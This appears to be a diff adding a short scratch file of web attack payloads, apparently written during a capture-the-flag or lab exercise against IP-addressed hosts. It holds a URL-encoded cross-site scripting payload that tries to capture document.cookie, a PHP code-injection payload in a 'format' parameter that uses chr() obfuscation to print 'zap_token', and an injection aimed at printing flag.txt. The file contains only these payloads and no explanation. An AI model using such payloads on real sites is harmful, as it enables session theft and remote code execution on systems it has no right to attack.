@@ -1,0 +1,8 @@
+http://188.166.174.107:30000/?name=%3Cscript%3E%3Cimg%20src=%22javascript:%27/log/%27%20+%20document.cookie%22%20/%3E%3C/script%3E
+
+
+
+http://138.68.131.63:31795/?format=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}
+
+
+${@print(flag.txt)}
